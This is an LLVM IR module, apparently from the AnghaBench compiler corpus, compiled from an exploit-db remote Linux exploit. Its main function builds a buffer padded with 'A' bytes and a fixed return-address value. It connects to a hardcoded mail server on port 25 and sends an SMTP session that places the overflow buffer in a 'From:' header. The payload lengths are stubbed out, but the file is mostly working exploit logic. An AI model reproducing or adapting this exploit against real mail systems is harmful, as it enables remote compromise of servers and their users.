; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20237.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20237.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@ADDRLEN = common dso_local global i32 0, align 4
@EXECLEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [39 x i8] c"   Usage: %s <Email Address> <offset>\0A\00", align 1
@.str.1 = private unnamed_addr constant [47 x i8] c"                                            \0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"mail.speakeasy.org\00", align 1
@.str.3 = private unnamed_addr constant [39 x i8] c"Could not resolve mail.speakeasy.org.\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [6 x i8] c"Error\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"Connection refused\0A\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"helo test\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"mail from: %s\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"rcpt to: %s\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [7 x i8] c"data\0D\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [17 x i8] c" Message Sent! \0A\00", align 1
@.str.11 = private unnamed_addr constant [47 x i8] c"From: %s AAAAAAAA test@test.net\0D\0A%s\0D\0A.\0D\0Aquit\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca i32, align 4
  %9 = alloca [100 x i8], align 16
  %10 = alloca [100 x i8], align 16
  %11 = alloca [100 x i8], align 16
  %12 = alloca [2500 x i8], align 16
  %13 = alloca [20 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @ADDRLEN, align 4
  %20 = call i64 @malloc(i32 %19)
  %21 = inttoptr i64 %20 to i8*
  store i8* %21, i8** %17, align 8
  %22 = load i32, i32* @EXECLEN, align 4
  %23 = call i64 @malloc(i32 %22)
  %24 = inttoptr i64 %23 to i8*
  store i8* %24, i8** %18, align 8
  %25 = load i32, i32* %4, align 4
  %26 = icmp slt i32 %25, 2
  br i1 %26, label %27, label %34

27:                                               ; preds = %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0), i8* %30)
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.1, i64 0, i64 0))
  %33 = call i32 @exit(i32 0) #3
  unreachable

34:                                               ; preds = %2
  %35 = load i32, i32* %4, align 4
  %36 = icmp eq i32 %35, 3
  br i1 %36, label %37, label %42

37:                                               ; preds = %34
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 2
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @atoi(i8* %40)
  store i32 %41, i32* %14, align 4
  br label %42

42:                                               ; preds = %37, %34
  store i64 3221219298, i64* %15, align 8
  %43 = load i8*, i8** %17, align 8
  %44 = load i32, i32* @ADDRLEN, align 4
  %45 = call i32 @memset(i8* %43, i32 65, i32 %44)
  %46 = call %struct.hostent* @gethostbyname(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  store %struct.hostent* %46, %struct.hostent** %7, align 8
  %47 = icmp eq %struct.hostent* %46, null
  br i1 %47, label %48, label %51

48:                                               ; preds = %42
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0))
  %50 = call i32 @exit(i32 1) #3
  unreachable

51:                                               ; preds = %42
  %52 = load i32, i32* @AF_INET, align 4
  %53 = load i32, i32* @SOCK_STREAM, align 4
  %54 = call i32 @socket(i32 %52, i32 %53, i32 0)
  store i32 %54, i32* %8, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %59

56:                                               ; preds = %51
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %58 = call i32 @exit(i32 1) #3
  unreachable

59:                                               ; preds = %51
  %60 = load i32, i32* @AF_INET, align 4
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 3
  store i32 %60, i32* %61, align 4
  %62 = call i32 @htons(i32 25)
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %62, i32* %63, align 4
  %64 = load %struct.hostent*, %struct.hostent** %7, align 8
  %65 = getelementptr inbounds %struct.hostent, %struct.hostent* %64, i32 0, i32 0
  %66 = load i64, i64* %65, align 8
  %67 = inttoptr i64 %66 to i32*
  %68 = load i32, i32* %67, align 4
  %69 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %69, i32 0, i32 0
  store i32 %68, i32* %70, align 4
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %72 = call i32 @bzero(i32* %71, i32 8)
  %73 = load i32, i32* %8, align 4
  %74 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %75 = call i32 @connect(i32 %73, %struct.sockaddr* %74, i32 4)
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %80

77:                                               ; preds = %59
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0))
  %79 = call i32 @exit(i32 1) #3
  unreachable

80:                                               ; preds = %59
  %81 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %82 = call i32 (i8*, i8*, ...) @sprintf(i8* %81, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0))
  %83 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 (i8*, i8*, ...) @sprintf(i8* %83, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0), i8* %86)
  %88 = load i32, i32* %8, align 4
  %89 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %90 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %91 = call i32 @strlen(i8* %90)
  %92 = call i32 @send(i32 %88, i8* %89, i32 %91, i32 0)
  %93 = load i32, i32* %8, align 4
  %94 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %95 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %96 = call i32 @strlen(i8* %95)
  %97 = call i32 @send(i32 %93, i8* %94, i32 %96, i32 0)
  %98 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %99 = load i8**, i8*** %5, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 1
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 (i8*, i8*, ...) @sprintf(i8* %98, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0), i8* %101)
  %103 = load i32, i32* %8, align 4
  %104 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %105 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %106 = call i32 @strlen(i8* %105)
  %107 = call i32 @send(i32 %103, i8* %104, i32 %106, i32 0)
  %108 = getelementptr inbounds [20 x i8], [20 x i8]* %13, i64 0, i64 0
  %109 = call i32 (i8*, i8*, ...) @sprintf(i8* %108, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  %110 = load i32, i32* %8, align 4
  %111 = getelementptr inbounds [20 x i8], [20 x i8]* %13, i64 0, i64 0
  %112 = getelementptr inbounds [20 x i8], [20 x i8]* %13, i64 0, i64 0
  %113 = call i32 @strlen(i8* %112)
  %114 = call i32 @send(i32 %110, i8* %111, i32 %113, i32 0)
  %115 = load i32, i32* @stderr, align 4
  %116 = call i32 @fprintf(i32 %115, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.10, i64 0, i64 0))
  %117 = getelementptr inbounds [2500 x i8], [2500 x i8]* %12, i64 0, i64 0
  %118 = load i8*, i8** %17, align 8
  %119 = load i8*, i8** %18, align 8
  %120 = call i32 (i8*, i8*, ...) @sprintf(i8* %117, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.11, i64 0, i64 0), i8* %118, i8* %119)
  %121 = load i32, i32* %8, align 4
  %122 = getelementptr inbounds [2500 x i8], [2500 x i8]* %12, i64 0, i64 0
  %123 = getelementptr inbounds [2500 x i8], [2500 x i8]* %12, i64 0, i64 0
  %124 = call i32 @strlen(i8* %123)
  %125 = call i32 @send(i32 %121, i8* %122, i32 %124, i32 0)
  %126 = load i32, i32* %8, align 4
  %127 = call i32 @close(i32 %126)
  %128 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
